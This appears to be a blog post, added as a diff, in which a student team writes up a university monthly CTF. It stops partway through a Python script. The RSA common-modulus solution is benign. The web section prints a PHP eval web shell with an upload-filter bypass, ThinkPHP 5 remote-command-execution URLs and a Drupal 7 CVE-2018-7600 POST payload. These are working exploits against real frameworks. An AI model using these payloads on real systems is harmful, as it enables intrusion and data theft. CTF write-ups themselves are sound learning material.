@@ -1,0 +1,837 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>CUMT-12月月赛 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言By 窝不管窝的flag都队 学校的月赛，还是要参加的,大部分是队友做的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMT-12月月赛">
+<meta property="og:url" content="http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%80/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言By 窝不管窝的flag都队 学校的月赛，还是要参加的,大部分是队友做的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdmltK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fdmo3F.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdmjN6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdnPud.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdnFHI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdneC8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdnMuj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fdnt8U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdnDV1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fdnfrd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdWuDO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdW2rT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdWsGn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdWECR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdWiE4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/15/FadvRJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FddSoT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdJ60S.png">
+<meta property="article:published_time" content="2018-12-16T08:23:03.000Z">
+<meta property="article:modified_time" content="2019-05-09T09:56:21.337Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="cumt双月赛一">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/12/16/FdmltK.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/12/16/大学CTF/CUMT双月赛一/" title="CUMT-12月月赛" itemprop="url">CUMT-12月月赛</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2018-12-16T08:23:03.000Z" itemprop="datePublished"> Published 2018-12-16</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">现代密码签到题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-upload"><span class="toc-number">3.1.</span> <span class="toc-text">ez-upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tp5"><span class="toc-number">3.2.</span> <span class="toc-text">Tp5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE"><span class="toc-number">4.</span> <span class="toc-text">CVE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number"></span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0%E9%A2%98-1"><span class="toc-number">1.</span> <span class="toc-text">现代密码签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">古典密码签到题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#First-Level"><span class="toc-number"></span> <span class="toc-text">First Level</span></a>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>By 窝不管窝的flag都队</p>
+<p>学校的月赛，还是要参加的,大部分是队友做的<span id="more"></span></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="现代密码签到题"><a href="#现代密码签到题" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h4><p>打开题目，下载了一个cipher文件，查看如下图<br><img src="https://s1.ax1x.com/2018/12/16/FdmltK.png" alt="FdmltK.png"></p>
+<p>可以猜测出是RSA密码，<br>但是也需要点脑洞<br>(‘O’, ‘I’, ‘Z’, ‘E’, ‘A’, ‘S’, ‘b’, ‘T’, ‘B’, ‘g’)-分别对应0,1,2,3,4,5,6,7,8,9</p>
+<p>这样，把英文字符转换成对应的数字，然后再进行解密</p>
+<p>解密脚本(大佬写的)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import gmpy2</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">	if a == 0:</span><br><span class="line">		return b, 0, 1</span><br><span class="line">	else:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		return g, x - b // a * y, y</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	alpha = [&#x27;O&#x27;,&#x27;T&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;b&#x27;,&#x27;Z&#x27;,&#x27;I&#x27;,&#x27;E&#x27;,&#x27;S&#x27;,&#x27;g&#x27;]</span><br><span class="line">	alphaPermu = list(itertools.permutations(alpha))</span><br><span class="line">	num = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;]</span><br><span class="line">	for x in alphaPermu:</span><br><span class="line">		flag = False</span><br><span class="line">		# print(x)</span><br><span class="line">		nn = &quot;xxxx&quot;</span><br><span class="line">		c1 = &quot;xxxx&quot;</span><br><span class="line">		c2 = &quot;xxxx&quot;</span><br><span class="line">		e1 = &quot;x&quot;</span><br><span class="line">		e2 = &quot;x&quot;</span><br><span class="line">		for i in range(10):</span><br><span class="line">			if (x[i] == &#x27;I&#x27; or x[i] == &#x27;g&#x27;) and i%2 == 0:</span><br><span class="line">				flag = True</span><br><span class="line">				break</span><br><span class="line">			nn = nn.replace(x[i],num[i])</span><br><span class="line">			c1 = c1.replace(x[i],num[i])</span><br><span class="line">			c2 = c2.replace(x[i],num[i])</span><br><span class="line">			e1 = e1.replace(x[i],num[i])</span><br><span class="line">			e2 = e2.replace(x[i],num[i])</span><br><span class="line">		if flag:</span><br><span class="line">			continue</span><br><span class="line">		n = int(nn,10)</span><br><span class="line">		c1 = int(c1,10)</span><br><span class="line">		c2 = int(c2,10)</span><br><span class="line">		e1 = int(e1,10)</span><br><span class="line">		e2 = int(e2,10)</span><br><span class="line">		if gmpy2.gcd(e1,e2) != 1:</span><br><span class="line">			continue</span><br><span class="line">		s = egcd(e1, e2)</span><br><span class="line">		s1 = s[1]</span><br><span class="line">		s2 = s[2]</span><br><span class="line">		if s1 &lt; 0:</span><br><span class="line">			s1 = -s1</span><br><span class="line">			try:</span><br><span class="line">				c1 = gmpy2.invert(c1, n)</span><br><span class="line">			except ZeroDivisionError:</span><br><span class="line">				continue</span><br><span class="line">		elif s2 &lt; 0:</span><br><span class="line">			s2 = -s2</span><br><span class="line">			try:</span><br><span class="line">				c2 = gmpy2.invert(c2, n)</span><br><span class="line">			except ZeroDivisionError:</span><br><span class="line">				continue</span><br><span class="line"></span><br><span class="line">		m = pow(c1, s1, n) * pow(c2, s2, n) % n</span><br><span class="line">		try:</span><br><span class="line">			temp = &#x27;&#123;:x&#125;&#x27;.format(m).decode(&#x27;hex&#x27;)</span><br><span class="line">			if &#x27;flag&#x27; in temp:</span><br><span class="line">				print(x)</span><br><span class="line">				print(temp)</span><br><span class="line">				break</span><br><span class="line">		except TypeError:</span><br><span class="line">			pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>即可得到flag</p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h4><p><img src="https://s1.ax1x.com/2018/12/16/Fdmo3F.png" alt="Fdmo3F.png"></p>
+<p>一道文件上传题，要绕过一下，不能提交php,asp等文件<br>新建一个文件，构建一句话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POAT</span>[<span class="string">&#x27;ee&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>绕过问题的话就是后缀名的问题<br>(开始尝试了很多.php;.jpg、.php.abc都不行，可以成功上传，但是菜刀连接不到数据库),最后，更改后缀名为.php5才可以。</p>
+<p>上传成功后，回显出一个文件路径，<br><img src="https://s1.ax1x.com/2018/12/16/FdmjN6.png" alt="FdmjN6.png"></p>
+<p>访问后无回显，果断用菜刀试一下，右键添加，进行如下设置<br><img src="https://s1.ax1x.com/2018/12/16/FdnPud.png" alt="FdnPud.png"></p>
+<p>即可拿到文件管理的权限<br><img src="https://s1.ax1x.com/2018/12/16/FdnFHI.png" alt="FdnFHI.png"></p>
+<p>当前目录下无flag文件，最终在根目录下找到flag文件<br><img src="https://s1.ax1x.com/2018/12/16/FdneC8.png" alt="FdneC8.png"></p>
+<h4 id="Tp5"><a href="#Tp5" class="headerlink" title="Tp5"></a>Tp5</h4><p>打开题目，如下<br><img src="https://s1.ax1x.com/2018/12/16/FdnMuj.png" alt="FdnMuj.png"></p>
+<p>这是thinkPHP v5，而thinkPHP5前段时间公布了一个远程命令执行漏洞<br>这里正好可以利用一下。<br>直接用现成的(没记住)payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls </span><br></pre></td></tr></table></figure>
+<p>(最后一个等于号后面可以直接输命令,ls 会回显当前目下的文件)</p>
+<p>可以看到当前目录下的文件，发现没有flag文件<br><img src="https://s1.ax1x.com/2018/12/16/Fdnt8U.png" alt="Fdnt8U.png"></p>
+<p>修改命令为 ls /  查看根目录<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2018/12/16/FdnDV1.png" alt="FdnDV1.png"></p>
+<p>发现flag文件，查看该文件用cat /flag<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag<br><img src="https://s1.ax1x.com/2018/12/16/Fdnfrd.png" alt="Fdnfrd.png"></p>
+<h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>hint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞，听都没听说过，Google一波，学习到了，贴个链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-">https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7-</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7c410db788ed">https://www.jianshu.com/p/7c410db788ed</a></p>
+<p>先创建账号，发现不可以发送email，google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候</p>
+<p>直接拿bp截断：</p>
+<p>构造post：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure>
+
+<p>这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdWuDO.png"></p>
+<p>保留这个form_build_id，拿hackbar post一下这个form_build_id，如下图：</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdW2rT.png"></p>
+<p>抓包截断，go一下回显根目录，发现flag文件，</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdWsGn.png"></p>
+<p>下一步就要继续尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成cat%20/flag </p>
+<p>即可（需要注意的就是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据）</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdWECR.png"></p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdWiE4.png"></p>
+<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="现代密码签到题-1"><a href="#现代密码签到题-1" class="headerlink" title="现代密码签到题"></a>现代密码签到题</h3><p>看到n, c1, c2, e1, e2，猜测这题考的是《密码学》课程中刚学的RSA共模攻击，要求明文m。</p>
+<p>先统计下n中的各字符出现频率：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>字词</th>
+<th>频次</th>
+<th>频率 %</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>O</td>
+<td>72</td>
+<td>11.6694</td>
+</tr>
+<tr>
+<td>2</td>
+<td>T</td>
+<td>69</td>
+<td>11.1831</td>
+</tr>
+<tr>
+<td>3</td>
+<td>A</td>
+<td>65</td>
+<td>10.5348</td>
+</tr>
+<tr>
+<td>4</td>
+<td>B</td>
+<td>63</td>
+<td>10.2107</td>
+</tr>
+<tr>
+<td>5</td>
+<td>b</td>
+<td>62</td>
+<td>10.0486</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Z</td>
+<td>62</td>
+<td>10.0486</td>
+</tr>
+<tr>
+<td>7</td>
+<td>I</td>
+<td>60</td>
+<td>9.7245</td>
+</tr>
+<tr>
+<td>8</td>
+<td>E</td>
+<td>56</td>
+<td>9.0762</td>
+</tr>
+<tr>
+<td>9</td>
+<td>S</td>
+<td>56</td>
+<td>9.0762</td>
+</tr>
+<tr>
+<td>10</td>
+<td>g</td>
+<td>52</td>
+<td>8.4279</td>
+</tr>
+</tbody></table>
+<p>再统计下c1中的：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>字词</th>
+<th>频次</th>
+<th>频率 %</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Z</td>
+<td>72</td>
+<td>11.6694</td>
+</tr>
+<tr>
+<td>2</td>
+<td>I</td>
+<td>67</td>
+<td>10.859</td>
+</tr>
+<tr>
+<td>3</td>
+<td>E</td>
+<td>66</td>
+<td>10.6969</td>
+</tr>
+<tr>
+<td>4</td>
+<td>S</td>
+<td>65</td>
+<td>10.5348</td>
+</tr>
+<tr>
+<td>5</td>
+<td>b</td>
+<td>62</td>
+<td>10.0486</td>
+</tr>
+<tr>
+<td>6</td>
+<td>g</td>
+<td>60</td>
+<td>9.7245</td>
+</tr>
+<tr>
+<td>7</td>
+<td>B</td>
+<td>59</td>
+<td>9.5624</td>
+</tr>
+<tr>
+<td>8</td>
+<td>O</td>
+<td>58</td>
+<td>9.4003</td>
+</tr>
+<tr>
+<td>9</td>
+<td>A</td>
+<td>55</td>
+<td>8.9141</td>
+</tr>
+<tr>
+<td>10</td>
+<td>T</td>
+<td>53</td>
+<td>8.59</td>
+</tr>
+</tbody></table>
+<p>发现只有10种字符，猜测他们对应数字0~9。那我们就可以列出他们的全排列，然后直接用算法。</p>
+<p><strong>优化：</strong></p>
+<p>因为n = pq，而p, q应该都是素数，那么个位肯定是奇数。</p>
+<p>因为gcd(e1,n) == gcd(e2,n) == 1，所以e1和e2的个位也是奇数。</p>
+<p>最后直接十六进制解密。</p>
+<p>Python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> g, x - b // a * y, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>			</span><br><span class="line">	alpha = [<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;g&#x27;</span>]</span><br><span class="line">	alphaPermu = <span class="built_in">list</span>(itertools.permutations(alpha))</span><br><span class="line">	num = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> alphaPermu:</span><br><span class="line">		flag = <span class="literal">False</span></span><br><span class="line">		<span class="comment"># print(x)</span></span><br><span class="line">		nn = <span class="string">&quot;ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI&quot;</span></span><br><span class="line">		c1 = <span class="string">&quot;ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI&quot;</span></span><br><span class="line">		c2 = <span class="string">&quot;IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT&quot;</span></span><br><span class="line">		e1 = <span class="string">&quot;IIIBTZBg&quot;</span></span><br><span class="line">		e2 = <span class="string">&quot;gbATZgI&quot;</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			<span class="keyword">if</span> (x[i] == <span class="string">&#x27;I&#x27;</span> <span class="keyword">or</span> x[i] == <span class="string">&#x27;g&#x27;</span>) <span class="keyword">and</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">				flag = <span class="literal">True</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			nn = nn.replace(x[i],num[i])</span><br><span class="line">			c1 = c1.replace(x[i],num[i])</span><br><span class="line">			c2 = c2.replace(x[i],num[i])</span><br><span class="line">			e1 = e1.replace(x[i],num[i])</span><br><span class="line">			e2 = e2.replace(x[i],num[i])</span><br><span class="line">		<span class="keyword">if</span> flag:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		n = <span class="built_in">int</span>(nn,<span class="number">10</span>)</span><br><span class="line">		c1 = <span class="built_in">int</span>(c1,<span class="number">10</span>)</span><br><span class="line">		c2 = <span class="built_in">int</span>(c2,<span class="number">10</span>)</span><br><span class="line">		e1 = <span class="built_in">int</span>(e1,<span class="number">10</span>)</span><br><span class="line">		e2 = <span class="built_in">int</span>(e2,<span class="number">10</span>)</span><br><span class="line">		<span class="keyword">if</span> gmpy2.gcd(e1,e2) != <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		s = 